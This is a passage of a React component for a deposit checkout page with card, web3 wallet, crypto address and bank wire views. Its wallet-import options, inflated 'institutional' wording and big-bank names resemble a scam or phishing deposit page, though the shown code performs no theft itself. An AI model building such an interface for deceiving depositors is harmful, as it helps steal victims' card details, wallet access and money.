                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5m0 0h4m-4 0V11m0 10V11m4 10V11m-8 0h8" />
                            </svg>
                          </div>
                          {/* Badge */}
                          <span className="rounded-full bg-white/5 px-3 py-1 text-xs font-medium text-neutral-300 ring-1 ring-white/10 backdrop-blur-md">
                            High-Value Wire
                          </span>
                        </div>

                        {/* Title & Details */}
                        <div className="space-y-1.5">
                          <h3 className="text-xl font-bold tracking-tight text-white">Bank Wire Transfer</h3>
                          <p className="text-xs text-neutral-400 leading-relaxed max-w-[280px]">
                            Domestic and international SWIFT/ACH wire transfers with dedicated institutional banking partners.
                          </p>
                        </div>

                        {/* Action Link */}
                        <div className="mt-5 flex items-center gap-1.5 text-xs font-semibold text-purple-400 group-hover:text-purple-300 transition-colors">
                          <span>Proceed</span>
                          <svg className="h-3.5 w-3.5 transition-transform duration-300 group-hover:translate-x-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M9 5l7 7-7 7" />
                          </svg>
                        </div>
                      </div>
                    </div>

                  </div>
                </motion.div>
              )}

              {/* STEP 2: FULL-SCREEN TAKEOVER DETAIL VIEWS */}
              {step === 'form' && (
                <motion.div 
                  key="form"
                  initial={{ opacity: 0, scale: 0.98 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.98 }}
                  className="relative min-h-[85vh] w-full rounded-[32px] bg-neutral-950 text-white flex flex-col justify-between p-6 sm:p-8 overflow-hidden ring-1 ring-white/10 shadow-2xl"
                >
                  {/* Surface Noise Overlay */}
                  <div className="pointer-events-none absolute inset-0 opacity-[0.035] mix-blend-overlay z-10" style={{ backgroundImage: `url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E")` }}></div>

                  {/* Dynamic Top Ambient Light glow based on selected method */}
                  <div className={`pointer-events-none absolute -top-20 left-1/2 -translate-x-1/2 h-64 w-full max-w-xl blur-3xl z-10 ${
                    selectedMethod === 'card' ? 'bg-emerald-500/15' :
                    selectedMethod === 'walletconnect' ? 'bg-indigo-500/15' :
                    selectedMethod === 'crypto' ? 'bg-amber-500/15' : 'bg-purple-500/15'
                  }`}></div>

                  {/* Specular Light Sheen */}
                  <div className="pointer-events-none absolute -top-24 left-1/2 -translate-x-1/2 h-32 w-full max-w-md rounded-full bg-gradient-to-b from-white/10 to-transparent blur-xl z-10"></div>

                  {/* 1. CREDIT / DEBIT CARD VIEW */}
                  {selectedMethod === 'card' && (
                    <form onSubmit={handleStartProcessing} className="relative z-20 flex flex-col justify-between h-full space-y-6">
                      {/* Header */}
                      <div className="flex items-center justify-between pb-6 border-b border-white/10">
                        <div className="text-left">
                          <h2 className="text-base sm:text-lg font-bold tracking-tight text-white">Credit / Debit Card</h2>
                          <p className="text-[11px] text-neutral-400">Configure parameters & routing</p>
                        </div>
                        <span className="rounded-full bg-emerald-500/10 px-3 py-1 text-xs font-semibold text-emerald-400 ring-1 ring-emerald-500/30">
                          Instant Card Pay
                        </span>
                      </div>

                      {/* Form Body */}
                      <div className="flex-1 space-y-6 my-2">
                        {/* Amount Selection */}
                        <div className="space-y-3">
                          <label className="text-xs font-bold tracking-wider text-neutral-400 uppercase">Deposit Amount (USD)</label>
                          <div className="flex items-center rounded-2xl bg-neutral-900/90 px-4 py-3.5 ring-1 ring-white/10 border-t border-white/15 shadow-inner">
                            <span className="text-xl font-bold text-emerald-400 mr-2">$</span>
                            <input 
                              type="number" 
                              value={amount} 
                              onChange={(e) => setAmount(Number(e.target.value))}
                              className="w-full bg-transparent text-2xl font-bold text-white outline-none" 
                            />
                          </div>
                          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 pt-1">
                            {[1000, 3000, 5000, 10000].map((amt) => (
                              <button 
                                type="button"
                                key={amt} 
                                onClick={() => setAmount(amt)}
                                className={`rounded-xl py-2.5 text-xs font-semibold transition ring-1 ${amount === amt ? 'bg-emerald-500 text-black ring-emerald-400 shadow-lg shadow-emerald-500/20 font-bold' : 'bg-white/5 text-neutral-300 ring-white/10 hover:bg-white/10'}`}
                              >
                                ${amt.toLocaleString()}
                              </button>
                            ))}
                          </div>
                        </div>

                        {/* Input Fields */}
                        <div className="space-y-4">
                          <div className="space-y-1.5">
                            <label className="text-xs font-medium text-neutral-300">Card Holder Name</label>
                            <input 
                              type="text" 
                              required
                              value={cardName}
                              onChange={(e) => setCardName(e.target.value)}
                              placeholder="Card Holder Name" 
                              className="w-full rounded-xl bg-neutral-900/90 px-4 py-3.5 text-sm text-white placeholder-neutral-500 ring-1 ring-white/10 focus:outline-none focus:ring-emerald-500/50" 
                            />
                          </div>

                          <div className="space-y-1.5">
                            <label className="text-xs font-medium text-neutral-300">Card Number</label>
                            <div className="relative flex items-center">
                              <input 
                                type="text" 
                                required
                                value={cardNumber}
                                onChange={(e) => setCardNumber(e.target.value)}
                                placeholder="Card Number" 
                                className="w-full rounded-xl bg-neutral-900/90 px-4 py-3.5 pr-28 text-sm font-mono text-white placeholder-neutral-500 ring-1 ring-white/10 focus:outline-none focus:ring-emerald-500/50" 
                              />
                              <div className="absolute right-2 flex items-center pointer-events-none space-x-1">
                                <VisaBadge />
                                <MastercardBadge />
                                <AmexBadge />
                              </div>
                            </div>
                          </div>

                          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                            <div className="space-y-1.5">
                              <label className="text-xs font-medium text-neutral-300">MM/YY</label>
                              <input 
                                type="text" 
                                required
                                value={cardExpiry}
                                onChange={(e) => setCardExpiry(e.target.value)}
                                placeholder="MM/YY" 
                                className="w-full rounded-xl bg-neutral-900/90 px-4 py-3.5 text-sm text-white placeholder-neutral-500 ring-1 ring-white/10 focus:outline-none focus:ring-emerald-500/50" 
                              />
                            </div>
                            <div className="space-y-1.5">
                              <label className="text-xs font-medium text-neutral-300">CVV</label>
                              <input 
                                type="password" 
                                required
                                maxLength={4}
                                value={cardCvv}
                                onChange={(e) => setCardCvv(e.target.value)}
                                placeholder="000" 
                                className="w-full rounded-xl bg-neutral-900/90 px-4 py-3.5 text-sm text-white placeholder-neutral-500 ring-1 ring-white/10 focus:outline-none focus:ring-emerald-500/50" 
                              />
                            </div>
                            <div className="space-y-1.5">
                              <label className="text-xs font-medium text-neutral-300">Country</label>
                              <select 
                                value={billingCountry}
                                onChange={(e) => setBillingCountry(e.target.value)}
                                className="w-full rounded-xl bg-neutral-900/90 px-4 py-3.5 text-sm text-white ring-1 ring-white/10 focus:outline-none focus:ring-emerald-500/50"
                              >
                                {PRESTIGIOUS_COUNTRIES.map(c => (
                                  <option key={c} value={c} className="bg-neutral-900">{c}</option>
                                ))}
                              </select>
                            </div>
                          </div>

                          {/* Save Card Checkbox */}
                          <div className="flex items-center gap-2.5 pt-1">
                            <input 
                              type="checkbox" 
                              id="saveCard" 
                              defaultChecked 
                              className="h-4 w-4 rounded border-neutral-700 bg-neutral-900 text-emerald-500 focus:ring-0 focus:ring-offset-0 accent-emerald-500 cursor-pointer" 
                            />
                            <label htmlFor="saveCard" className="text-xs text-neutral-300 cursor-pointer select-none flex items-center gap-1.5">
                              Save my card for faster checkout
                              <span className="inline-flex items-center justify-center h-3.5 w-3.5 rounded-full bg-white/10 text-[9px] text-neutral-400 font-bold" title="Securely save your card for 1-click future deposits">?</span>
                            </label>
                          </div>
                        </div>
                      </div>

                      {/* Action Footer */}
                      <div className="pt-2 space-y-3">
                        <button 
                          type="submit"
                          className="w-full rounded-xl bg-amber-300 hover:bg-amber-400 py-4 text-sm font-extrabold text-neutral-950 shadow-lg shadow-amber-300/20 active:scale-[0.98] transition flex items-center justify-center gap-2"
                        >
                          <Lock className="h-4 w-4 text-neutral-950" />
                          PAY {amount.toLocaleString()} USD
                        </button>
                        
                        <p className="text-[11px] text-center text-neutral-400 leading-normal">
                          By clicking the button you confirm to have accepted <a href="#terms" className="text-emerald-400 hover:underline">Terms of Service</a>
                        </p>
                      </div>
                    </form>
                  )}

                  {/* 2. WALLETCONNECT / WEB3 VIEW */}
                  {selectedMethod === 'walletconnect' && (
                    <div className="relative z-20 flex flex-col justify-between h-full space-y-6">
                      {/* Header */}
                      <div className="flex items-center justify-between pb-6 border-b border-white/10">
                        <div className="text-left sm:text-center flex-1">
                          <h2 className="text-base sm:text-lg font-bold tracking-tight text-white">Connect Self-Custody</h2>
                          <p className="text-[11px] text-neutral-400">Establish cryptographic session</p>
                        </div>
                        <span className="rounded-full bg-indigo-500/10 px-3 py-1 text-xs font-semibold text-indigo-400 ring-1 ring-indigo-500/30">
                          Web3
                        </span>
                      </div>

                      {/* Main Content */}
                      <div className="flex-1 space-y-6 my-2">
                        {!walletConnected ? (
                          <div className="space-y-3">
                            <p className="text-xs text-neutral-400 font-medium">Select your preferred provider:</p>
                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                              {WALLETS.map((w) => (
                                <button 
                                  key={w.name} 
                                  onClick={() => handleConnectWallet(w.name)}
                                  className={`group relative w-full overflow-hidden rounded-2xl bg-neutral-900/90 p-4 ring-1 ring-white/10 border-t border-white/15 hover:ring-indigo-500/50 transition-all text-left flex items-center justify-between ${
                                    selectedWallet === w.name ? 'ring-2 ring-indigo-500 bg-indigo-950/20' : ''
                                  }`}
                                >
                                  <div className="relative z-10 flex items-center gap-3.5">
                                    {w.name === 'Import Existing Wallet' || w.name === 'Connect Wallet Manually' ? (
                                      <div className="w-10 h-10 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center shrink-0">
                                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
                                          <circle cx="7.5" cy="15.5" r="5.5"/>
                                          <path d="m21 2-9.6 9.6"/>
                                          <path d="m15.5 7.5 3 3"/>
                                          <path d="m18 5 3 3"/>
                                        </svg>
                                      </div>
                                    ) : (
                                      <div className="flex h-11 w-11 items-center justify-center rounded-xl bg-white/5 ring-1 ring-white/10 overflow-hidden shrink-0">
                                        <WalletLogo name={w.name} className="w-full h-full rounded-xl object-cover" />
                                      </div>
                                    )}
                                    <div>
                                      <h4 className="text-sm font-bold text-white group-hover:text-indigo-300 transition-colors">{w.name}</h4>
                                      <p className="text-[11px] text-neutral-400">{w.desc}</p>
                                    </div>
                                  </div>
                                  {isConnectingWallet && selectedWallet === w.name ? (
                                    <RefreshCw className="h-4 w-4 text-indigo-400 animate-spin" />
                                  ) : (
                                    <ChevronRight className="h-4 w-4 text-neutral-500 transition-transform group-hover:translate-x-1 group-hover:text-white" />
                                  )}
                                </button>
                              ))}
                            </div>
                          </div>
                        ) : (
                          <div className="p-6 rounded-2xl bg-indigo-950/40 ring-1 ring-indigo-500/40 border border-indigo-500/30 space-y-4 shadow-xl">
                            <div className="flex items-center justify-between">
                              <div className="flex items-center gap-2.5">
                                <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse" />
                                <span className="text-xs font-bold text-emerald-400 uppercase tracking-wider bg-emerald-500/10 px-2.5 py-0.5 rounded-full border border-emerald-500/30">
                                  Connected
                                </span>
                                <span className="text-xs font-bold text-white">
                                  {selectedWallet}
                                </span>
                              </div>
                              <button 
                                onClick={() => {
                                  setWalletConnected(false);
                                  setConnectedAddress('');
                                }} 
                                className="text-xs font-bold text-indigo-400 hover:text-indigo-300 hover:underline transition"
                              >
                                Disconnect
                              </button>
                            </div>

                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-3 border-t border-indigo-500/20 text-xs">
                              <div>
                                <span className="text-neutral-400 block text-[11px] mb-1">Public Wallet Address</span>
                                <div className="flex items-center justify-between gap-2 font-mono text-white text-sm font-bold bg-black/40 p-2.5 rounded-xl border border-white/10">
                                  <span className="truncate">{abbreviateAddress(connectedAddress)}</span>
                                  <button 
                                    type="button"
                                    onClick={() => handleCopy(connectedAddress)}
                                    className="p-1.5 rounded text-indigo-400 hover:text-indigo-300 hover:bg-white/5 transition"
                                    title="Copy full address"
                                  >
                                    {copiedAddress ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                                  </button>
                                </div>
                              </div>
                              <div>
                                <span className="text-neutral-400 block text-[11px] mb-1">Connected Network</span>
                                <div className="font-semibold text-white text-sm bg-black/40 p-2.5 rounded-xl border border-white/10 flex items-center justify-between">
                                  <span>{connectedNetwork || 'Ethereum (ERC-20)'}</span>
                                  <span className="text-[10px] font-bold text-indigo-400 bg-indigo-500/10 px-2 py-0.5 rounded border border-indigo-500/20">Active</span>
                                </div>
                              </div>
                            </div>
                          </div>
                        )}
                      </div>

                      {/* Action Footer */}
                      <div className="pt-4 border-t border-white/10 space-y-2">
                        {walletConnected && (
                          <button 
                            onClick={handleStartProcessing}
                            className="w-full rounded-xl bg-indigo-600 py-4 text-sm font-bold text-white shadow-lg shadow-indigo-600/30 hover:bg-indigo-500 active:scale-[0.98] transition flex items-center justify-center gap-2"
                          >
                            <span>Confirm & Deposit via Web3</span>
                            <ChevronRight className="w-4 h-4" />
                          </button>
                        )}
                        <p className="text-center text-[11px] text-neutral-500">Secured via end-to-end multi-sig session protocol</p>
                      </div>
                    </div>
                  )}

                  {/* 3. CRYPTO COLD STORAGE VIEW */}
                  {selectedMethod === 'crypto' && (
                    <div className="relative z-20 flex flex-col justify-between h-full space-y-6">
                      {/* Header */}
                      <div className="flex items-center justify-between pb-6 border-b border-white/10">
                        <div>
                          <h2 className="text-base sm:text-lg font-bold tracking-tight text-white">Crypto Cold Storage</h2>
                          <p className="text-[11px] text-neutral-400">Segregated vault deposit</p>
                        </div>
                        <span className="rounded-full bg-amber-500/10 px-3 py-1 text-xs font-semibold text-amber-400 ring-1 ring-amber-500/30">
                          Multi-Chain
                        </span>
                      </div>

                      {/* Content Body */}
                      <div className="flex-1 space-y-6 my-2">
                        {/* Amount Selection */}
                        <div className="space-y-3">
                          <label className="text-xs font-bold tracking-wider text-neutral-400 uppercase">Amount</label>
                          <div className="flex items-center rounded-2xl bg-neutral-900/90 px-4 py-3.5 ring-1 ring-white/10 border-t border-white/15 shadow-inner">
                            <span className="text-xl font-bold text-amber-400 mr-2">$</span>
                            <input 
                              type="number" 
                              value={amount} 
                              onChange={(e) => setAmount(Number(e.target.value))}
                              className="w-full bg-transparent text-2xl font-bold text-white outline-none" 
                            />
                          </div>
                        </div>

                        {/* Asset Selector Pills */}
                        <div className="space-y-2">
                          <div className="grid grid-cols-2 sm:flex sm:items-center sm:gap-3 items-center">
                            <label className="text-xs font-medium text-neutral-300">Select Digital Asset</label>
                            <div className="flex justify-start">
                              <button
                                type="button"
                                onClick={() => setShowOthersCryptoModal(true)}
                                className={`py-1.5 px-3 rounded-full text-xs font-semibold ring-1 transition flex items-center gap-1.5 cursor-pointer shrink-0 ${
                                  isOtherCryptoSelected
                                    ? 'bg-amber-500 text-black ring-amber-400 shadow-sm shadow-amber-500/20'
                                    : 'bg-white/5 text-neutral-300 ring-white/10 hover:bg-white/10 hover:text-white'
                                }`}
                                title="Other Cryptocurrencies"
                              >
                                <Coins className="w-3.5 h-3.5 text-amber-400 flex-shrink-0" />
                                <span>{isOtherCryptoSelected ? `Others: ${selectedCrypto.symbol}` : 'Others'}</span>
                              </button>
                            </div>
                          </div>

                          <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-7 gap-2">
                            {CRYPTO_ASSETS.map((asset) => (
                              <button 
                                key={asset.symbol} 
                                type="button"
                                onClick={() => setSelectedCrypto(asset)}
                                className={`py-2.5 px-3 rounded-xl text-xs font-bold ring-1 transition flex items-center justify-center gap-1.5 ${
                                  selectedCrypto.symbol === asset.symbol 
                                    ? 'bg-amber-500 text-black ring-amber-400 shadow-md shadow-amber-500/20' 
                                    : 'bg-white/5 text-neutral-300 ring-white/10 hover:bg-white/10'
                                } ${
                                  asset.symbol === 'BNB' ? 'col-span-2 sm:col-span-2 lg:col-span-1' : ''
                                }`}
                              >
                                <CryptoLogo symbol={asset.symbol} className="w-5 h-5 flex-shrink-0" />
                                <span>{asset.symbol}</span>
                              </button>
                            ))}
                          </div>
                        </div>

                        {/* Exact Transfer Amount */}
                        <div className="space-y-2">
                          <label className="text-xs font-bold tracking-wider text-neutral-400 uppercase">You Will Send</label>
                          <div className="rounded-xl bg-neutral-900/90 ring-1 ring-white/10 border-t border-white/15 shadow-xl p-4 overflow-hidden relative">
                            {/* Subtle Floating Amount Copied Toast */}
                            <AnimatePresence>
                              {copiedExactAmount && (
                                <motion.div
                                  initial={{ opacity: 0, y: 10, scale: 0.95 }}
                                  animate={{ opacity: 1, y: 0, scale: 1 }}
                                  exit={{ opacity: 0, y: 10, scale: 0.95 }}
                                  className="absolute top-2 right-2 z-50 flex items-center gap-1 px-2.5 py-1 rounded-full bg-zinc-950/95 border border-zinc-800 text-emerald-400 text-[10px] font-bold shadow-md backdrop-blur"
                                >
                                  <Check className="w-3 h-3 stroke-[2.5]" />
                                  <span>Amount copied</span>
                                </motion.div>
                              )}
                            </AnimatePresence>

                            {/* Asset Info Header Row */}
                            <div className="flex items-center gap-2.5 relative z-10">
                              <div className="w-8 h-8 rounded-full bg-neutral-800 ring-1 ring-white/10 flex items-center justify-center flex-shrink-0 shadow-inner">
                                <CryptoLogo symbol={selectedCrypto.symbol} className="w-5 h-5" />
                              </div>
                              <div className="flex flex-col">
                                <span className="text-sm font-bold text-white leading-tight">
                                  {selectedCrypto.name}
                                </span>
                                <span className="text-xs text-neutral-400 font-medium leading-none mt-0.5">
                                  {selectedCrypto.network}
                                </span>
                              </div>
                            </div>

                            {/* Exact Crypto Amount + Copy Button */}
                            <div className="mt-3 flex items-center justify-between gap-4 relative z-10">
                              {isPricingLoading ? (
                                <div className="h-10 w-44 bg-white/5 rounded animate-pulse" />
                              ) : pricingError ? (
                                <div className="text-sm text-red-400 font-medium">Unable to retrieve exchange rate.</div>
                              ) : (
                                <div className="flex-1 min-w-0">
                                  <div className="flex items-baseline gap-1.5">
                                    <span className="text-xl sm:text-2xl font-bold text-white tracking-tight leading-none break-all">
                                      {formatExactAmount(exactCryptoAmount, selectedCrypto.symbol)}
                                    </span>
                                    <span className="text-lg font-semibold text-neutral-400 leading-none">
                                      {selectedCrypto.symbol.split('-')[0]}
                                    </span>
                                  </div>
                                </div>
                              )}

                              <button
                                type="button"
                                onClick={async () => {
                                  const success = await copyToClipboard(formatExactAmount(exactCryptoAmount, selectedCrypto.symbol));
                                  if (success) {
                                    setCopiedExactAmount(true);
                                    setTimeout(() => setCopiedExactAmount(false), 2000);
                                  }
                                }}
                                className="px-2.5 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-neutral-300 hover:text-white transition-colors cursor-pointer flex items-center gap-1.5 flex-shrink-0"
                                title="Copy Exact Amount"
                              >
                                <Copy className="w-3.5 h-3.5" />
                                <span className="text-xs font-semibold">Copy</span>
                              </button>
                            </div>

                            {/* Concise Disclaimer Footer */}
                            <div className="mt-3 pt-3 border-t border-white/5 relative z-10">
                              <p className="text-xs text-neutral-400 leading-normal">
                                Send only this exact amount using the selected network.
                              </p>
                            </div>
                          </div>
                        </div>

                        {/* QR & Address Card */}
                        <div className="p-6 rounded-2xl bg-neutral-900/90 ring-1 ring-white/15 border-t border-white/20 shadow-2xl flex flex-col sm:flex-row items-center gap-6">
                          <div className="p-3 rounded-2xl bg-white shadow-xl flex flex-col items-center justify-center flex-shrink-0">
                            <QRCodeSVG
                              value={selectedCrypto.address}
                              size={128}
                              level="H"
                              bgColor="#ffffff"
                              fgColor="#000000"
                              imageSettings={{
                                src: getCryptoLogoDataUrl(selectedCrypto.symbol),
                                x: undefined,
                                y: undefined,
                                height: 28,
                                width: 28,
                                excavate: true,
                              }}
                            />
                            <span className="text-[10px] font-bold text-neutral-950 mt-1.5 uppercase">{selectedCrypto.symbol} Vault</span>
                          </div>

                          <div className="space-y-3 flex-1 w-full">
                            <div className="flex items-center justify-between">
                              <span className="text-xs font-bold text-neutral-300 uppercase">Segregated {selectedCrypto.name} Address</span>
                              <span className="rounded-full bg-amber-500/10 px-2.5 py-0.5 text-[10px] font-bold text-amber-400 ring-1 ring-amber-500/30">
                                {selectedCrypto.network}
                              </span>
                            </div>

                            <div className="flex items-center justify-between rounded-xl bg-neutral-950 p-3.5 ring-1 ring-white/10 border-t border-white/10 font-mono text-xs">
                              <span className="truncate pr-2 text-neutral-200">{selectedCrypto.address}</span>
                              <button 
                                onClick={() => handleCopy(selectedCrypto.address)}
                                className="rounded-lg bg-amber-500/10 px-3 py-1.5 text-xs font-bold text-amber-400 ring-1 ring-amber-500/30 hover:bg-amber-500/20 active:scale-95 transition flex items-center gap-1"
                              >
                                {copiedAddress ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                                <span>{copiedAddress ? 'Copied' : 'Copy'}</span>
                              </button>
                            </div>

                            {/* Warning Callout */}
                            <div className="p-3 rounded-xl bg-amber-500/10 ring-1 ring-amber-500/20 text-xs text-amber-300 leading-relaxed flex items-center gap-2">
                              <AlertCircle className="w-4 h-4 text-amber-400 flex-shrink-0" />
                              <span>Send only {selectedCrypto.symbol} on {selectedCrypto.network}. Settlement: {selectedCrypto.estTime}.</span>
                            </div>
                          </div>
                        </div>
                      </div>

                      {/* Action Footer */}
                      <div className="pt-4 border-t border-white/10">
                        <button 
                          onClick={() => setShowConfirmDepositModal(true)}
                          disabled={pricingError}
                          className={`w-full rounded-xl py-4 text-sm font-bold shadow-lg transition flex items-center justify-center gap-2 ${
                            pricingError 
                              ? 'bg-neutral-800 text-neutral-500 cursor-not-allowed shadow-none' 
                              : 'bg-amber-500 text-black shadow-amber-500/25 hover:bg-amber-400 active:scale-[0.98] cursor-pointer'
                          }`}
                        >
                          <span>{pricingError ? 'Exchange Rate Unavailable' : `I Have Deposited ${selectedCrypto.symbol}`}</span>
                          <ChevronRight className="w-4 h-4" />
                        </button>
                      </div>
                    </div>
                  )}

                  {/* Confirm Deposit Modal */}
                  {showConfirmDepositModal && (
                    <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
                      <motion.div
                        initial={{ opacity: 0, scale: 0.95 }}
                        animate={{ opacity: 1, scale: 1 }}
                        exit={{ opacity: 0, scale: 0.95 }}
                        className="w-full max-w-md rounded-2xl bg-neutral-950 border border-white/10 p-6 shadow-2xl text-white space-y-6"
                      >
                        <div className="space-y-2 text-center">
                          <h3 className="text-xl font-bold tracking-tight text-white">Confirm Deposit</h3>
                          <p className="text-xs text-neutral-400 leading-relaxed">
                            Please confirm that you have completed the transfer to the displayed wallet address. Once confirmed, your deposit request will be submitted for verification.
                          </p>
                        </div>

                        <div className="space-y-3 pt-2">
                          <button
                            type="button"
                            onClick={() => {
                              setShowConfirmDepositModal(false);
                              handleStartProcessing();
                            }}
                            className="w-full py-3.5 rounded-xl bg-white text-black font-bold text-sm hover:bg-neutral-200 transition cursor-pointer"
                          >
                            I Have Deposited {selectedCrypto?.symbol || 'Crypto'}
                          </button>
                          <button
                            type="button"
                            onClick={() => setShowConfirmDepositModal(false)}
                            className="w-full py-3.5 rounded-xl bg-white/5 border border-white/10 text-neutral-300 font-semibold text-sm hover:bg-white/10 transition cursor-pointer"
                          >
                            Cancel
                          </button>
                        </div>
                      </motion.div>
                    </div>
                  )}

                  {/* Others Cryptocurrencies Modal */}
                  <AnimatePresence>
                    {showOthersCryptoModal && (
                      <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
                        <motion.div
                          initial={{ opacity: 0, scale: 0.95, y: 8 }}
                          animate={{ opacity: 1, scale: 1, y: 0 }}
                          exit={{ opacity: 0, scale: 0.95, y: 8 }}
                          transition={{ duration: 0.15 }}
                          className="w-full max-w-md rounded-2xl bg-neutral-950 border border-white/15 p-5 sm:p-6 shadow-2xl text-white space-y-4"
                        >
                          {/* Header */}
                          <div className="flex items-center justify-between pb-3 border-b border-white/10">
                            <div className="flex items-center gap-2.5">
                              <div className="w-8 h-8 rounded-xl bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-400">
                                <Coins className="w-4 h-4" />
                              </div>
                              <div>
                                <h3 className="text-base font-bold text-white leading-tight">Other Cryptocurrencies</h3>
                                <p className="text-[11px] text-neutral-400">Select an asset to deposit via segregated vault</p>
                              </div>
                            </div>
                            <button
                              type="button"
                              onClick={() => setShowOthersCryptoModal(false)}
                              className="w-8 h-8 rounded-lg bg-white/5 hover:bg-white/10 text-neutral-400 hover:text-white flex items-center justify-center transition"
                            >
                              <X className="w-4 h-4" />
                            </button>
                          </div>

                          {/* Search Input */}
                          <div className="relative">
                            <Search className="w-4 h-4 text-neutral-400 absolute left-3 top-1/2 -translate-y-1/2" />
                            <input
                              type="text"
                              value={searchOtherCrypto}
                              onChange={(e) => setSearchOtherCrypto(e.target.value)}
                              placeholder="Search crypto or network (e.g. XRP, Ripple)..."
                              className="w-full bg-neutral-900 border border-white/10 rounded-xl pl-9 pr-3 py-2 text-xs text-white placeholder-neutral-500 focus:outline-none focus:border-amber-500/60 focus:ring-1 focus:ring-amber-500/50"
                            />
                          </div>

                          {/* Cryptos List */}
                          <div className="space-y-2 max-h-[340px] overflow-y-auto pr-1">
                            {filteredOtherAssets.length === 0 ? (
                              <div className="p-4 text-center text-xs text-neutral-500">
                                No matching cryptocurrency found
                              </div>
                            ) : (
                              filteredOtherAssets.map((asset) => {
                                const isSelected = selectedCrypto.symbol === asset.symbol;
                                return (
                                  <button
                                    key={asset.symbol}
                                    type="button"
                                    onClick={() => {
                                      setSelectedCrypto(asset);
                                      setShowOthersCryptoModal(false);
                                    }}
                                    className={`w-full p-3 rounded-xl border transition flex items-center justify-between text-left group cursor-pointer ${
                                      isSelected
                                        ? 'bg-amber-500/15 border-amber-500/50 ring-1 ring-amber-500/30'
                                        : 'bg-neutral-900/70 hover:bg-neutral-900 border-white/10 hover:border-white/20'
                                    }`}
                                  >
                                    <div className="flex items-center gap-3 min-w-0">
                                      <div className="relative shrink-0">
                                        <CryptoLogo symbol={asset.symbol} className="w-9 h-9 rounded-xl shadow-md" />
                                        <span className="absolute -bottom-0.5 -right-0.5 w-3 h-3 rounded-full bg-emerald-500 border-2 border-neutral-950" />
                                      </div>
                                      <div className="min-w-0">
                                        <div className="flex items-center gap-2">
                                          <span className="text-sm font-bold text-white group-hover:text-amber-400 transition">{asset.symbol}</span>
                                          <span className="text-xs text-neutral-400 truncate font-medium">{asset.name}</span>
                                        </div>
                                        <div className="flex items-center gap-2 mt-0.5">
                                          <span className="text-[10px] text-neutral-400 font-mono truncate max-w-[130px] sm:max-w-[170px]">
                                            {asset.address.slice(0, 8)}...{asset.address.slice(-6)}
                                          </span>
                                          <span className="text-[9px] px-1.5 py-0.5 rounded bg-white/5 border border-white/10 text-neutral-300">
                                            {asset.network}
                                          </span>
                                        </div>
                                      </div>
                                    </div>

                                    <div className="flex items-center gap-2 shrink-0">
                                      {isSelected && (
                                        <div className="w-5 h-5 rounded-full bg-amber-500 text-black flex items-center justify-center">
                                          <Check className="w-3 h-3 stroke-[3]" />
                                        </div>
                                      )}
                                    </div>
                                  </button>
                                );
                              })
                            )}
                          </div>

                          {/* Footer Action */}
                          <div className="pt-2 border-t border-white/10 flex items-center justify-between text-xs">
                            <span className="text-[11px] text-neutral-400">{filteredOtherAssets.length} cryptocurrencies configured</span>
                            <button
                              type="button"
                              onClick={() => setShowOthersCryptoModal(false)}
                              className="px-4 py-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-neutral-300 hover:text-white text-xs font-semibold transition cursor-pointer"
                            >
                              Close
                            </button>
                          </div>
                        </motion.div>
                      </div>
                    )}
                  </AnimatePresence>

                  {/* 4. BANK WIRE TRANSFER VIEW */}
                  {selectedMethod === 'bank' && (
                    <div className="relative z-20 flex flex-col justify-between h-full space-y-6">
                      {/* Header */}
                      <div className="flex items-center justify-between pb-6 border-b border-white/10">
                        <div className="text-left">
                          <h2 className="text-base sm:text-lg font-bold tracking-tight text-white">Bank Wire Transfer</h2>
                          <p className="text-[11px] text-neutral-400">Institutional clearing details</p>
                        </div>
                        <span className="rounded-full bg-purple-500/10 px-3 py-1 text-xs font-semibold text-purple-400 ring-1 ring-purple-500/30">
                          High-Value Wire
                        </span>
                      </div>

                      {/* Content Body */}
                      <div className="flex-1 space-y-6 my-2">
                        {/* Amount Input */}
                        <div className="space-y-3">
                          <label className="text-xs font-bold tracking-wider text-neutral-400 uppercase">Wire Amount (USD)</label>
                          <div className="flex items-center rounded-2xl bg-neutral-900/90 px-4 py-3.5 ring-1 ring-white/10 border-t border-white/15 shadow-inner">
                            <span className="text-xl font-bold text-purple-400 mr-2">$</span>
                            <input 
                              type="number" 
                              value={amount} 
                              onChange={(e) => setAmount(Number(e.target.value))}
                              className="w-full bg-transparent text-2xl font-bold text-white outline-none" 
                            />
                          </div>
                        </div>

                        {/* Detailed Wire Spec Cards */}
                        <div className="space-y-3">
                          <div className="flex items-center justify-between">
                            <p className="text-xs text-neutral-400">Execute your wire transfer using official institutional parameters:</p>
                            <span className="text-[10px] font-mono text-purple-400 font-bold">SWIFT / IBAN / ACH</span>
                          </div>

                          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                            {[
                              { label: 'Beneficiary Bank', value: 'JPMorgan Chase N.A. / HSBC' },
